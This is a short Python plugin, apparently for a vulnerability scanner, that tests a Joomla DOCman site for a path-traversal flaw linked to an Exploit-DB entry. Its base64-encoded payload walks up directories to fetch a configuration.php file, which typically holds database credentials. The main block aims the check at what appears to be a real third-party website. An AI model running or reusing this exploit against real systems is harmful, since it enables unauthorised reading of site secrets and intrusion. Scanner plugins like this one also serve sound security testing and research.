#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = Joomla DOCman Component_Path_Get
#__Refer___ = https://www.exploit-db.com/exploits/37620/

import re

def assign(service, arg):
	if service == 'joomla':
		return True, arg

def audit(arg):
    payload = 'components/com_docman/dl2.php?archive=0&file=Li4vLi4vLi4vLi4vLi4vLi4vLi4vdGFyZ2V0L3d3dy9jb25maWd1cmF0aW9uLnBocA=='
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target);
    if code == 200:
    	res = re.findall('<b>([^<]+)</b> on line <b>', body)
    	if (len(res) > 0):
    		security_warning(res[0])

if __name__ == '__main__':
	from dummy import *
	audit(assign('joomla', 'http://www.inprecor.org.br/inprecor/')[1])